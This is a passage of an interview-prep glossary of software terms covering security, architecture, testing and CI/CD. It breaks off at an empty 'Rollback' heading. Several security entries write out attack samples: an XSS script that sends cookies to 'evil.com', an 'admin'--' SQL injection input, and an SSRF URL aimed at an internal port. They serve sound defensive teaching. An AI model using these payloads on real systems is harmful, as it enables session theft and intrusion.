**Definition:** Rate limiting caps requests per key (IP, user, API key) over time to protect upstreams and ensure fairness. Algorithms include fixed windows (simple boundary bursts), sliding windows (smoother), and token/leaky buckets (steady refill with burst allowance). Responses use `429` and `Retry-After` when applicable.

**Practical example:** A public [REST](#rest) tier allows 100 RPM per token; abusive clients receive backoff headers while premium tiers have higher buckets.

**Interview usage:** “I pair rate limits with observability—know who gets throttled and whether limits match real usage patterns.”

**Common confusion:** Per-IP limits only—legitimate users behind NAT get unfair blocks; user-scoped keys are often fairer.

**Related terms:** Throttling, quota, circuit breaker

**Tech Lead note:** Rate limits encode product policy and incident posture—align caps with contracts and support expectations before launch traffic.

## Security

### Authentication

**Area:** Identity and access management

**Definition:** Authentication is the process of proving who a principal (user, device, or service) claims to be before any access is granted. It answers “who are you?” using something the subject knows (password, PIN), has (phone, hardware key), or is (biometrics). Strong systems combine factors and tie credentials to lifecycle events like rotation, lockout, and revocation.

**Practical example:** A user signs in with email/password plus a TOTP from an authenticator app; the API gateway validates a client certificate for machine-to-machine traffic before issuing short-lived tokens.

**Interview usage:** Draw a clear line before authorization: “We authenticate first—validate identity and session or token—then we authorize each action against policy.” Example phrasing: “Our login path uses OIDC; downstream services trust the identity claims after the IdP’s signature is verified.”

**Common confusion:** People conflate “logged in” with “allowed to do X”; authentication does not imply permission to perform a specific operation.

**Related terms:** Authorization, MFA, OIDC, JWT, Session

**Tech Lead note:** Push the team to define threat models for credential theft and session fixation; authentication is where most customer-visible security incidents start.

### Authorization

**Area:** Identity and access management

**Definition:** Authorization decides what an already-authenticated principal may do on which resources. It encodes policy as roles, attributes, scopes, or explicit grants and is enforced at boundaries (API, UI, data layer). Correct systems fail closed: deny by default and log denials for audit without leaking sensitive existence details.

**Practical example:** After OAuth token validation, an API checks whether the token’s scopes include `orders:write` and whether the order’s `tenant_id` matches the caller’s tenant before allowing PATCH.

**Interview usage:** Separate concerns explicitly: “Authentication establishes identity; authorization enforces least privilege per request.” Example phrasing: “We use RBAC at the org level and ABAC-style checks on resource ownership for multi-tenant data.”

**Common confusion:** Encoding permissions inside JWT claims without server-side checks, or trusting client-side UI hiding as security.

**Related terms:** Authentication, RBAC, OAuth 2.0, JWT, [Security](./15-security.md)

**Tech Lead note:** Align product and legal on who can see PII; authorization bugs are often regulatory incidents, not bugs.

### RBAC (Role-Based Access Control)

**Area:** Access control models

**Definition:** RBAC assigns permissions to named roles (e.g., `billing_admin`, `viewer`) and assigns roles to users or groups. Evaluation is “does this principal have a role that grants this permission?” It scales operationally but can sprawl into role explosion if every niche permission becomes its own role; hybrid models add attributes or resource-level rules.

**Practical example:** In an internal admin console, engineers get `support_readonly` while on-call leads get `support_write` for the same routes; IAM syncs group membership from the corporate directory nightly.

**Interview usage:** Contrast with ad-hoc per-user grants: “We standardize on RBAC with a small catalog of roles and periodic access reviews.” Example phrasing: “New permissions require a new role or an extension to an existing one with a documented data-owner approval.”

**Common confusion:** Treating roles as org chart titles instead of least-privilege bundles tied to job functions.

**Related terms:** Authorization, OAuth 2.0, Authentication, [Security](./15-security.md)

### OAuth 2.0

**Area:** Delegated authorization and API security

**Definition:** OAuth 2.0 is a standardized framework for obtaining limited access to a resource on behalf of a resource owner, without sharing the owner’s password with third-party clients. It defines roles (authorization server, resource server, client), grant types (e.g., authorization code with PKCE, client credentials), and token issuance. It does not define authentication of end users by itself—that layering is OIDC.

**Practical example:** A mobile app opens the system browser for login; the authorization server returns an authorization code exchanged server-side for access and refresh tokens scoped to `calendar.readonly`.

**Interview usage:** Name flows and tradeoffs: “Public clients use authorization code + PKCE; M2M uses client credentials with rotating secrets or mTLS.” Example phrasing: “We treat access tokens as opaque to clients and validate them at the resource server.”

**Common confusion:** Assuming OAuth *is* authentication, or storing long-lived refresh tokens in browser localStorage without hardening.

**Related terms:** OIDC, JWT, Authentication, Authorization, [Security](./15-security.md)

**Tech Lead note:** OAuth touches UX, compliance, and incident response; standardize token lifetimes, revocation, and client registration before dozens of integrations accumulate.

### OIDC (OpenID Connect)

**Area:** Identity protocols

**Definition:** OpenID Connect builds on OAuth 2.0 to authenticate end users and convey identity claims. Clients obtain an **ID token** (typically a JWT) from the OpenID Provider, may call the **userinfo** endpoint for additional claims, and use standard discovery (`/.well-known/openid-configuration`). It standardizes subjects (`sub`), nonce handling for replay resistance, and logout flows in many implementations.

**Practical example:** A SaaS app redirects to Okta; after successful login, the backend receives an ID token, validates issuer and audience, maps `sub` to an internal user row, and creates an application session.

**Interview usage:** Position the split: “OAuth delegates access to APIs; OIDC proves *who* logged in.” Example phrasing: “We rely on OIDC for first-party login and OAuth client credentials for service-to-service calls.”

**Common confusion:** Using access tokens as proof of user identity, or skipping nonce validation in implicit-style patterns.

**Related terms:** OAuth 2.0, JWT, Authentication, Session, [Security](./15-security.md)

### JWT (JSON Web Token)

**Area:** Tokens and credentials

**Definition:** A JWT is a compact, URL-safe string of three Base64url-encoded parts—header (algorithms, type), payload (claims), and signature—joined by dots. Integrity relies on symmetric or asymmetric signing; confidentiality is *not* provided unless nested encryption (JWE) is used. Claims often carry subject, audience, expiry, and custom scopes; verifiers must check `exp`, `iss`, `aud`, and algorithm (“alg none” attacks).

**Practical example:** An API gateway validates RS256 signatures using the IdP’s JWKS, enforces a five-minute `exp` skew policy, and propagates `sub` and `tenant_id` headers to upstreams.

**Interview usage:** Be precise about trust boundaries: “We verify JWTs at every hop that needs strong identity; we don’t trust client-provided claims without signature validation.” Example phrasing: “Large payloads belong in the database, not in the JWT.”

**Common confusion:** Storing secrets in JWT payloads, skipping rotation of signing keys, or calling JWT-based auth “stateless” while still needing server-side revocation lists.

**Related terms:** OAuth 2.0, OIDC, Session, Authentication, [Security](./15-security.md)

**Tech Lead note:** Decide as a team when to use opaque server-side sessions versus signed JWTs; the choice drives logout semantics, key management, and support load.

### Session

**Area:** Stateful authentication

**Definition:** A session binds authenticated state on the server (or a centralized store) to an opaque **session ID**, commonly delivered via HTTP-only, secure cookies. The server looks up session data on each request, which enables instant revocation and server-controlled expiry at the cost of shared storage and stickiness considerations at scale.

**Practical example:** After OIDC login, the app sets a cookie referencing a Redis-backed session holding user id, roles, and CSRF token; logout deletes the Redis key.

**Interview usage:** Contrast with bearer JWTs: “Sessions give us server-side kill switches; JWTs push complexity to expiry and revocation infrastructure.” Example phrasing: “We rotate session IDs on privilege elevation to reduce fixation risk.”

**Common confusion:** Assuming sessions are insecure compared to JWTs, or storing JWTs in cookies without hardening against theft and CSRF.

**Related terms:** Authentication, CSRF, JWT, MFA, [Security](./15-security.md)

### CSRF (Cross-Site Request Forgery)

**Area:** Web application security

**Definition:** CSRF tricks a victim’s browser into submitting an authenticated request to a site where the victim already has a session, exploiting the browser’s automatic inclusion of cookies. Defenses include CSRF tokens bound to the session, `SameSite` cookies, and verifying `Origin`/`Referer` for state-changing requests.

**Practical example:** An attacker embeds an auto-submitting POST form to `bank.com/transfer`; if the victim is logged in and no CSRF token is required, funds move without the victim’s intent.

**Interview usage:** Tie defense to session models: “Any cookie-based session that mutates state needs anti-CSRF controls or strict SameSite policies.” Example phrasing: “We require a double-submit cookie or synchronizer token on all unsafe HTTP methods.”

**Common confusion:** Confusing CSRF with XSS—CSRF does not require script injection on the target site; XSS often makes CSRF easier but is a different class.

**Related terms:** XSS, Session, CORS, CSP, [Security](./15-security.md)

### XSS (Cross-Site Scripting)

**Area:** Web application security

**Definition:** XSS injects attacker-controlled script into a context where the browser executes it in the victim’s session, stealing tokens, altering DOM, or pivoting to CSRF. **Stored** XSS persists in databases; **reflected** XSS bounces input off a response; **DOM-based** XSS arises from insecure client-side sinks (e.g., `innerHTML`, `eval`) without server round-trips.

**Practical example:** A comment field renders raw HTML; an attacker posts `<script>fetch('https://evil.com?c='+document.cookie)</script>` and harvests session cookies from viewers.

**Interview usage:** Stack defenses: “Encode output by context, sanitize rich text with allowlists, and default CSP to reduce inline script.” Example phrasing: “We treat user content as data, not HTML, unless passed through a vetted sanitizer.”

**Common confusion:** Believing HTTPS alone stops XSS, or relying only on input validation without output encoding.

**Related terms:** CSRF, CSP, Session, Authentication, [Security](./15-security.md)

### SQL injection

**Area:** Application and data-layer security

**Definition:** SQL injection submits crafted input that alters the structure or semantics of a server-side SQL query—reading arbitrary rows, bypassing auth, or destroying data. It thrives when user input is concatenated into SQL. **Parameterized queries** (prepared statements) separate code from data and eliminate the class for most relational access patterns.

**Practical example:** A login query built as `"SELECT * FROM users WHERE username='" + name + "'"` allows `admin'--` to comment out the password clause; switching to bound parameters closes the hole.

**Interview usage:** Show engineering discipline: “Every query path uses an ORM or prepared statements; dynamic identifiers are allowlisted.” Example phrasing: “We added integration tests that assert suspicious inputs cannot change query shape.”

**Common confusion:** Assuming ORMs prevent all injection by default—unsafe raw SQL and string formatting still exist.

**Related terms:** SSRF, Authorization, [Security](./15-security.md), [Software Architecture](./14-software-architecture.md)

### SSRF (Server-Side Request Forgery)

**Area:** Network and application security

**Definition:** SSRF coerces a server into issuing HTTP or other requests chosen by the attacker, often reaching internal IPs, cloud metadata endpoints (`169.254.169.254`), or private services behind the perimeter. It commonly appears in URL fetchers, webhooks, PDF generators, and import features. Mitigations include URL allowlists, disabling redirects, network segmentation, and metadata IMDSv2-style protections.

**Practical example:** A “preview link” feature fetches user-supplied URLs server-side; an attacker supplies `http://127.0.0.1:11211/` to scan the memcached port from inside the VPC.

**Interview usage:** Frame blast radius: “Untrusted URLs never drive server-side fetches without egress controls and blocklists for RFC1918 and link-local ranges.” Example phrasing: “We resolved SSRF by putting fetchers in a sandboxed account with no IAM instance profiles.”

**Common confusion:** Thinking firewalls fully protect internal services; SSRF uses the server’s *trusted* network position.

**Related terms:** CORS, SQL injection, [Security](./15-security.md), [System Design](./13-system-design.md)

### CORS (Cross-Origin Resource Sharing)

**Area:** Browser security

**Definition:** CORS is a browser-enforced policy for cross-origin requests initiated from JavaScript, mediated via response headers (`Access-Control-Allow-Origin`, credentials flags, preflight `OPTIONS`). Servers opt in to which origins may read responses; browsers block leaking responses to unauthorized origins. It is not a substitute for authentication or authorization on the API.

**Practical example:** `app.example.com` calls `api.example.com` with credentials; the API responds with `Access-Control-Allow-Origin: https://app.example.com` and `Access-Control-Allow-Credentials: true` after validating the session cookie.

**Interview usage:** Clarify scope: “CORS protects *browser* users from malicious sites reading cross-origin responses; attackers with curl ignore CORS.” Example phrasing: “We use explicit origin allowlists, not `*`, when cookies are involved.”

**Common confusion:** Setting permissive CORS “to fix errors” while relying on it as the only access control.

**Related terms:** CSP, CSRF, Authentication, [Security](./15-security.md)

### CSP (Content Security Policy)

**Area:** Browser security and XSS mitigation

**Definition:** CSP is delivered via HTTP headers (`Content-Security-Policy`) to instruct the browser which sources may load scripts, styles, images, connections, frames, and more. `default-src`, `script-src 'nonce-…'`, and `report-uri`/`report-to` reduce XSS impact by blocking inline scripts and unauthorized origins. It complements—but does not replace—correct encoding and sanitization.

**Practical example:** A strict policy uses nonces for approved inline bootstraps and `object-src 'none'`; violations post to a reporting endpoint for triage.

**Interview usage:** Describe rollout: “We started in report-only mode, fixed violations, then enforced.” Example phrasing: “CSP shrunk our XSS blast radius even when a template slipped through review.”

**Common confusion:** Expecting CSP to stop server-side request smuggling or SQLi—it is predominantly a browser-side control.

**Related terms:** XSS, CORS, [Security](./15-security.md)

### MFA (Multi-Factor Authentication)

**Area:** Identity and access management

**Definition:** MFA requires two or more independent verification factors (knowledge, possession, inherence) before granting access. TOTP, push approvals, hardware FIDO2 keys, and SMS (weaker) raise the bar against phishing or password reuse. Implementation must handle enrollment, recovery, lockout, and auditing without trapping users without backup factors.

**Practical example:** Corporate SSO mandates WebAuthn for employees; contractors use TOTP with backup codes stored in a vault; risky actions re-prompt with step-up MFA.

**Interview usage:** Balance security and UX: “We mandate MFA for admin roles and optional for consumers with risk-based prompts on new devices.” Example phrasing: “Phishing-resistant MFA reduced account takeover tickets by a measurable margin.”

**Common confusion:** Treating security questions or email links as a second factor comparable to a cryptographic device.

**Related terms:** Authentication, Session, OIDC, JWT, [Security](./15-security.md)


## Architecture and System Design

### Monolith

**Area:** System structure

**Definition:** A monolith is a single deployable that contains most or all of an application’s features, data access, and integrations. It shares one process (or tightly coupled processes), one release cadence, and often one repository. It is not an anti-pattern by default: many successful systems stay monolithic for operational simplicity until scale or team topology forces a split.

**Practical example:** One Spring Boot or Rails app serves web UI, REST API, and background jobs connected to a primary database, deployed as one artifact behind a load balancer.

**Interview usage:** Avoid caricature: “We run a monolith deliberately for cohesion; we extract services when boundaries and SLO pressure justify the overhead.” Example phrasing: “Our scaling bottleneck was the database, not deployment shape, so we sharded before microservices.”

**Common confusion:** Equating monolith with “legacy” or “unstructured”; a monolith can be well-modularized internally.

**Related terms:** Modular monolith, Microservice, ADR, [Software Architecture](./14-software-architecture.md), [System Design](./13-system-design.md)

### Modular monolith

**Area:** System structure

**Definition:** A modular monolith enforces clear **module boundaries** inside one deployable—packages or layers with explicit APIs, dependency rules, and sometimes separate persistence schemas per module, while still shipping a single binary. It captures many benefits of separation (ownership, testability) without distributed-system costs. It is a common stepping stone before extracting microservices.

**Practical example:** Gradle modules `billing`, `inventory`, and `shipping` forbid cross-imports except via published interfaces; each owns its tables and domain events emitted in-process.

**Interview usage:** Explain migration strategy: “We tightened module boundaries in-repo before we paid network splits.” Example phrasing: “The strangler route targeted one modular package first.”

**Common confusion:** Assuming folders named “services” equal real isolation without compile-time or runtime enforcement.

**Related terms:** Monolith, Microservice, Bounded context, Strangler fig pattern, [Software Architecture](./14-software-architecture.md)

### Microservice

**Area:** Distributed systems

**Definition:** A microservice is an independently deployable component with its own release cycle, runtime, and typically **bounded** data ownership, communicating over the network. Alignment to domain boundaries reduces coupling but introduces partial failures, distributed transactions, observability needs, and API versioning discipline. The goal is team autonomy at the cost of operational complexity.

**Practical example:** An `orders` service owns its PostgreSQL schema and publishes `OrderPlaced` events; `notifications` consumes them and scales on different hardware.

**Interview usage:** Anchor on tradeoffs: “We split when deployment independence outweighed network and consistency costs.” Example phrasing: “Each service has an explicit SLA and consumer-driven contracts in CI.”

**Common confusion:** Creating dozens of CRUD services without domain seams, producing a distributed ball of mud.

**Related terms:** Bounded context, Monolith, Modular monolith, Event sourcing, [System Design](./13-system-design.md)

**Tech Lead note:** Gate service extraction with team topology and SLO evidence; premature distribution burns velocity and on-call health.

### Bounded context

**Area:** Domain-Driven Design

**Definition:** A bounded context is a linguistic and modeling boundary where a domain model is internally consistent—terms like “Account” or “Shipment” mean one thing inside the context and may differ elsewhere. Contexts integrate via explicit patterns (anti-corruption layers, published language, events) rather than shared mutable models. Teams align ownership to contexts to reduce ambiguity.

**Practical example:** “Customer” in billing stores tax IDs and payment methods; “Customer” in CRM stores leads and campaigns—two contexts linked by IDs and integration events, not one shared `customers` table for everything.

**Interview usage:** Connect to org design: “We map squads to bounded contexts so ubiquitous language stays coherent.” Example phrasing: “Duplicated concepts across contexts are OK; conflated models are not.”

**Common confusion:** Treating a database schema as the universal domain model across the whole company.

**Related terms:** Aggregate, Microservice, Modular monolith, [Software Architecture](./14-software-architecture.md)

**Tech Lead note:** Facilitate glossary workshops across contexts; integration bugs often trace to ambiguous nouns.

### Aggregate

**Area:** Domain-Driven Design

**Definition:** An aggregate is a cluster of domain objects (entities and value objects) treated as one consistency **unit** for transactional writes. One aggregate root mediates external access; invariants hold within the aggregate’s boundary per transaction. Cross-aggregate updates use eventual consistency (events, sagas) rather than giant distributed two-phase commits.

**Practical example:** `Order` is the root; `LineItem` entities change only through `Order` methods so totals and inventory reservations stay consistent in one commit.

**Interview usage:** Show transaction thinking: “We size aggregates so one command touches one transaction boundary.” Example phrasing: “Loading the whole catalog as one aggregate would serialize the world—we split by `Product` and `Category` roots.”

**Common confusion:** Mapping aggregates 1:1 to database rows or API resources without behavior-rich roots.

**Related terms:** Bounded context, Event sourcing, CQRS, [Software Architecture](./14-software-architecture.md)

### CQRS (Command Query Responsibility Segregation)

**Area:** Architectural pattern

**Definition:** CQRS separates **commands** (state-changing operations) from **queries** (reads), often with different models, storage paths, or scaling profiles. Writes may go through a normalized transactional store; reads may denormalize into views, search indexes, or caches updated asynchronously. It clarifies intent in code but adds synchronization complexity and eventual read consistency unless carefully engineered.

**Practical example:** Commands append to an orders table; a projector builds a read-optimized `order_summaries` table for the storefront list view updated via outbox events.

**Interview usage:** Justify complexity: “We adopted CQRS when read patterns outscaled write contention and required specialized indexes.” Example phrasing: “UI lists tolerate seconds of lag; checkout commands stay strongly consistent per aggregate.”

**Common confusion:** Using CQRS for trivial CRUD without clear scaling or modeling pressure, doubling maintenance cost.

**Related terms:** Event sourcing, Aggregate, Microservice, [Software Architecture](./14-software-architecture.md), [System Design](./13-system-design.md)

### Event sourcing

**Area:** Persistence and domain modeling

**Definition:** Event sourcing stores state as an append-only **sequence of domain events** rather than only the latest row snapshot. Current state is derived by replaying events or maintained via projections. It yields audit trails, temporal queries, and flexible read models, but demands schema evolution discipline, idempotent consumers, and snapshot/compaction strategies for long streams.

**Practical example:** Each `InventoryAdjusted` event records SKU, delta, and correlation id; dashboards rebuild balances from the stream; disputes replay history for a SKU.

**Interview usage:** Be honest about ops: “Event sourcing gave us auditability but required versioning and replay tooling.” Example phrasing: “We pair it with CQRS projections for customer-facing reads.”

**Common confusion:** Using an event log as a message bus without defining aggregate boundaries and projection consistency guarantees.

**Related terms:** CQRS, Aggregate, Microservice, [System Design](./13-system-design.md)

### ADR (Architecture Decision Record)

**Area:** Engineering process

**Definition:** An ADR captures a significant architectural choice in a short, versioned document: context, decision drivers considered, the decision itself, and consequences (positive, negative, risks). It creates organizational memory beyond tribal knowledge and Slack threads. A common format is one ADR per decision with a status (proposed, accepted, superseded).

**Practical example:** ADR-12 records why the team chose PostgreSQL over DynamoDB for billing ledgers, citing transactions and reporting needs, and notes re-evaluation triggers if RPS doubles.

**Interview usage:** Demonstrate leadership habits: “We write ADRs before irreversible commits of infrastructure spend.” Example phrasing: “New engineers read ADRs 7–9 to understand why our events are outbox-backed.”

**Common confusion:** Treating ADRs as design specs; they record *decisions*, not full RFC designs.

**Related terms:** RFC, Modular monolith, Microservice, [Software Architecture](./14-software-architecture.md)

### RFC (Request for Comments)

**Area:** Engineering process

**Definition:** An RFC is a lightweight, collaborative proposal circulated before implementation for feedback on design, risks, and rollout. It typically includes problem statement, proposed approach, alternatives, migration plan, and open questions. Severity ranges from a Google Doc to a repo Markdown file with reviewers assigned; the goal is early alignment and risk surfacing.

**Practical example:** A two-page RFC proposes switching feature flags vendors, lists data residency concerns, and requests security review before procurement starts.

**Interview usage:** Show how you scale decisions: “Non-trivial changes get a short RFC; ADRs capture what we actually shipped.” Example phrasing: “We time-box RFC comments to five business days to avoid analysis paralysis.”

**Common confusion:** Confusing internal RFCs with IETF RFCs; both share intent (seek review) but differ in governance.

**Related terms:** ADR, Strangler fig pattern, Microservice, [Software Architecture](./14-software-architecture.md)

### Strangler fig pattern

**Area:** Legacy modernization

**Definition:** The strangler fig pattern incrementally replaces a legacy system by routing slices of traffic or functionality through a new implementation behind a facade, proxy, or API gateway—growing the “new” system until the old one can be retired. It reduces big-bang risk and allows validation per domain vertical. Success depends on routing fidelity, data synchronization, and rollback plans.

**Practical example:** A reverse proxy sends `/checkout/*` to a new Node service while other paths stay on the mainframe COBOL path until the next slice migrates.

**Interview usage:** Communicate risk management: “We strangulate by subdomain, not by random endpoints.” Example phrasing: “Feature flags and traffic percentages let us compare error budgets between old and new paths.”

**Common confusion:** Running dual writes indefinitely without reconciliation; strangler needs an end-state for data authority.

**Related terms:** Monolith, Microservice, Modular monolith, ADR, [System Design](./13-system-design.md), [Software Architecture](./14-software-architecture.md)


## Testing and Quality

### Unit test

**Area:** Test taxonomy

**Definition:** Unit tests exercise the smallest meaningful units—functions, classes, or modules—in isolation from slow or flaky dependencies. They should be fast, deterministic, and narrow in scope, using test doubles for I/O, clocks, and randomness. They anchor refactoring confidence and catch regressions close to the fault.

**Practical example:** `PriceCalculatorTest` verifies tax rules with injected `Clock` and fixed exchange rates, completing in milliseconds with no database.

**Interview usage:** Define your pyramid base: “Unit tests are our default for pure domain logic before heavier layers run.” Example phrasing: “We forbid real network calls in unit tests—those belong in integration suites.”

**Common confusion:** Calling tests “unit” while hitting Dockerized databases; that cost belongs elsewhere.

**Related terms:** Integration test, Mock, Stub, Regression test, [Testing and Quality](./16-testing-and-quality.md)

### Integration test

**Area:** Test taxonomy

**Definition:** Integration tests validate interactions between components—ORM and database, service and queue, client and wire protocol—often using real infrastructure or faithful test containers. They are slower than unit tests but catch wiring, schema, and serialization bugs. Scope control prevents a second end-to-end layer: pick a seam and stub the rest.

**Practical example:** `OrderRepositoryIT` boots Testcontainers PostgreSQL, runs migrations, and asserts constraints and transaction behavior the ORM relies on.

**Interview usage:** Position in CI: “Integration tests gate merges on contract and persistence behavior; they run in parallel shards.” Example phrasing: “We keep them under ten minutes by isolating scenarios per container image.”

**Common confusion:** Running full production stacks for every scenario, producing flaky pipelines.

**Related terms:** Unit test, End-to-end test, Contract test, Flaky test, [Testing and Quality](./16-testing-and-quality.md)

### End-to-end test

**Area:** Test taxonomy

**Definition:** End-to-end tests drive complete user journeys across UI, APIs, and backing services in an environment that mirrors production topology (often staging). They yield high behavioral confidence but tend to be slow, brittle to timing and data, and expensive to maintain. Teams cap count, prioritize critical paths, and invest in stable selectors and test data factories.

**Practical example:** Playwright signs up a user, checks out with a test card, and confirms an order email webhook in a sandbox mail catcher.

**Interview usage:** Show restraint: “We reserve E2E for revenue paths; everything else layers down the pyramid.” Example phrasing: “Flaky E2E gets quarantined with owner and SLA, not ignored.”

**Common confusion:** Replacing integration tests with E2E for every API variant, inflating runtime and noise.

**Related terms:** Integration test, Contract test, Flaky test, Regression test, [Testing and Quality](./16-testing-and-quality.md)

### Contract test

**Area:** Cross-service testing

**Definition:** Contract tests verify that a consumer’s expectations of an API match the provider’s implementation without always running full stacks. Consumer tests publish contracts; provider verification ensures responses and schemas align (tools like Pact or Spring Cloud Contract). They catch breaking changes before deployment and document API evolution explicitly.

**Practical example:** A mobile app’s Pact file asserts `GET /user` returns `id` as UUID; the user service runs provider tests in CI with states stubbing downstream auth.

**Interview usage:** Highlight decoupling: “Contract tests let teams release independently with shared CI gates.” Example phrasing: “We fail builds when provider code drifts from consumer-generated contracts.”

**Common confusion:** Treating JSON schema alone as sufficient behavioral contract without example-driven interactions.

**Related terms:** Integration test, Microservice, Mock, [Testing and Quality](./16-testing-and-quality.md), [System Design](./13-system-design.md)

**Tech Lead note:** Invest in contract testing when service count grows; handshake meetings do not scale.

### Mock

**Area:** Test doubles

**Definition:** A mock is a test double that records **expected interactions** (methods called, arguments, order) and fails the test if reality diverges. It encodes behavioral contracts, not fixed return values—though it may stub returns while enforcing calls. Over-mocking can couple tests to implementation details rather than outcomes.

**Practical example:** `mockPaymentGateway.expectCharge(amount: 9900, currency: "USD")` verifies checkout invoked the gateway once with the computed total.

**Interview usage:** Contrast with stubs: “Mocks assert collaboration; stubs fake data.” Example phrasing: “We mock external partners at boundaries, not every private method.”

**Common confusion:** Using “mock” colloquially for any fake object, including simple stubs.

**Related terms:** Stub, Unit test, Integration test, Contract test, [Testing and Quality](./16-testing-and-quality.md)

### Stub

**Area:** Test doubles

**Definition:** A stub supplies **canned responses** or minimal behavior to isolate the system under test without asserting how it was invoked. It simplifies setup when interaction verification is irrelevant. Stubs keep tests readable when outputs are deterministic and call order does not matter.

**Practical example:** A `StubTaxService` always returns 8.5% for any jurisdiction so pricing tests ignore tax engine complexity.

**Interview usage:** Choose deliberately: “We stub IO boundaries; we mock only when call correctness is the assertion.” Example phrasing: “Over-mocking internals made refactors painful—stubs at the edge fixed that.”

**Common confusion:** Using stubs when verifying side effects (charges, emails) is exactly what you need—use fakes or mocks with expectations.

**Related terms:** Mock, Unit test, Integration test, [Testing and Quality](./16-testing-and-quality.md)

### Flaky test

**Area:** Test reliability

**Definition:** A flaky test passes and fails on identical code due to timing, shared state, network, data ordering, or insufficient isolation. Flakiness erodes CI trust, hides real regressions, and encourages reruns instead of fixes. Remediation includes quarantine policies, deterministic waits, hermetic environments, and seed control.

**Practical example:** A UI test fails when animation timing exceeds a hard `sleep(500)`; switching to explicit readiness probes stabilizes results.

**Interview usage:** Show operational maturity: “We track flaky rate per suite and block merges on new flakes.” Example phrasing: “That test shared a global clock—we injected time control and removed race windows.”

**Common confusion:** Blaming infrastructure without reproducing locally or capturing artifacts.

**Related terms:** End-to-end test, Integration test, Regression test, [Testing and Quality](./16-testing-and-quality.md)

**Tech Lead note:** Treat flake accumulation as a team health metric; tolerating reruns trains bad habits.

### Regression test

**Area:** Test strategy

**Definition:** A regression test locks in behavior after a bug fix so the defect cannot return unnoticed—often added as a unit or integration case reproducing the original failure mode. Regression suites grow over time; pruning redundant coverage and grouping by fault domain keeps maintenance sustainable.

**Practical example:** After fixing timezone bugs in report generation, `ReportExportTest` asserts a DST boundary case that once produced off-by-one-day totals.

**Interview usage:** Link quality to incidents: “Every sev-2+ gets a regression test before close.” Example phrasing: “Our playbook requires the failing input attached in the test name or comment.”

**Common confusion:** Assuming old broad E2E tests are sufficient regression nets without targeted reproduction near the fault.

**Related terms:** Unit test, Integration test, Flaky test, [Testing and Quality](./16-testing-and-quality.md)

## CI/CD and DevOps

### Continuous integration (CI)

**Area:** CI/CD and DevOps ([CI/CD and DevOps](./17-ci-cd-and-devops.md))

**Definition:** Continuous integration is the practice of merging small changes into a shared mainline frequently—often daily—and validating each integration with an automated build and test pipeline. Trunk-based development complements CI by keeping the default branch deployable and shortening branch lifetime, which reduces merge pain and surfaces integration defects early.

**Practical example:** A team merges behind a feature flag; every push to `main` runs unit tests, linting, and integration tests in the main pipeline before the change is considered accepted.

**Interview usage:** You might say, “We treated CI as the quality gate for the trunk: short-lived branches, mandatory green builds, and flaky tests quarantined so the signal stayed trustworthy.”

**Common confusion:** CI is not “we run tests sometimes”; without automation on every meaningful merge, you lose the feedback loop that defines CI.

**Related terms:** Continuous delivery, Pipeline, Trunk-based development, Artifact

**Tech Lead note:** You own pipeline reliability and test culture—flaky CI erodes trust faster than missing features.

### Continuous delivery (CD)

**Area:** CI/CD and DevOps ([CI/CD and DevOps](./17-ci-cd-and-devops.md))

**Definition:** Continuous delivery means keeping the software in a releasable state continuously: every commit that passes the pipeline could be deployed to production with low risk. A manual release gate or approval step may still exist; the distinction from continuous deployment is that delivery stops short of automatic production rollout unless the org chooses that model.

**Practical example:** After CI passes, an artifact is promoted through staging; the release manager clicks “deploy” during the change window, but no extra manual build step is required.

**Interview usage:** “We optimized for deployability—feature flags and backward-compatible migrations—so CD meant a business decision to release, not a multi-day integration project.”

**Common confusion:** CD is often conflated with continuous deployment; delivery emphasizes readiness, not necessarily automatic production pushes.

**Related terms:** Continuous integration, Blue/green deployment, Canary deployment, Artifact

### Pipeline

**Area:** CI/CD and DevOps ([CI/CD and DevOps](./17-ci-cd-and-devops.md))

**Definition:** A pipeline is the automated sequence of stages—build, test, security scan, package, deploy—executed by a CI/CD system. Modern systems typically declare pipelines as code (for example YAML) so changes are reviewed like application code and environments stay reproducible.

**Practical example:** A GitHub Actions workflow runs `npm ci`, `vitest`, builds a Docker image, pushes to a registry, and triggers a deploy job gated on branch and environment.

**Interview usage:** “I break pipelines into fast feedback stages versus expensive stages, and parallelize where dependency order allows.”

**Common confusion:** A single long script is not a pipeline if it lacks staged failure semantics, caching discipline, and clear promotion rules between environments.

**Related terms:** Continuous integration, Artifact, Infrastructure as Code, Rollback

**Tech Lead note:** Design pipelines for median developer wait time and actionable failures—opaque red builds waste the whole team’s focus.

### Artifact

**Area:** CI/CD and DevOps ([CI/CD and DevOps](./17-ci-cd-and-devops.md))

**Definition:** An artifact is an immutable, versioned output of a build—container image, JAR, wheel, or static bundle—stored in an artifact or container registry for promotion across environments. Pinning artifacts to Git commits or semantic versions ties what runs in production to an auditable source state.

**Practical example:** CI produces `api-service:1.4.2` with a digest; production references that digest so redeploys are deterministic.

**Interview usage:** “We promoted the same artifact from staging to prod—no rebuild on production deploys—to eliminate ‘works on the build agent’ drift.”

**Common confusion:** Source code in Git is not the deployable artifact; rebuilding without locking dependencies can change behavior between stages.

**Related terms:** Continuous delivery, Pipeline, Blue/green deployment, Rollback

### Blue/green deployment

**Area:** CI/CD and DevOps ([CI/CD and DevOps](./17-ci-cd-and-devops.md))

**Definition:** Blue/green deployment maintains two parallel environments (blue and green) with identical capacity. One serves live traffic while the other receives the new release; after health checks and validation, traffic switches in one step (often via load balancer or DNS). Rollback is rapid by pointing traffic back at the idle color.

**Practical example:** Green runs the new API version behind an internal health suite; the load balancer flips weights from blue to green once dashboards in [Observability](./18-observability.md) stay green for a bake period.

**Interview usage:** “We used blue/green when we needed instant rollback and could afford duplicate infra for the cutover window.”

**Common confusion:** Blue/green does not remove the need for backward-compatible database changes; schema coupling can still break the idle environment during validation.

**Related terms:** Canary deployment, Rollback, Continuous delivery, Artifact

### Canary deployment

**Area:** CI/CD and DevOps ([CI/CD and DevOps](./17-ci-cd-and-devops.md))

**Definition:** A canary routes a small percentage of production traffic to a new version while the majority stays on the prior release. You expand the slice as confidence grows, guided by error rates, latency, and business metrics—overlapping [Performance and Scalability](./19-performance-and-scalability.md) and [Observability](./18-observability.md) signals.

**Practical example:** Five percent of users hit pods running `v2` via service mesh weights; after thirty minutes without SLO burn, traffic ramps to fifty, then one hundred percent.

**Interview usage:** “Canary gave us controlled blast radius; we automated promotion on SLI gates and rollback on regression.”

**Common confusion:** Canary is not A/B testing for product experimentation unless you intentionally instrument and analyze cohort behavior; the primary goal is safe rollout.

**Related terms:** Blue/green deployment, Rollback, SLI, Error budget

### Rollback

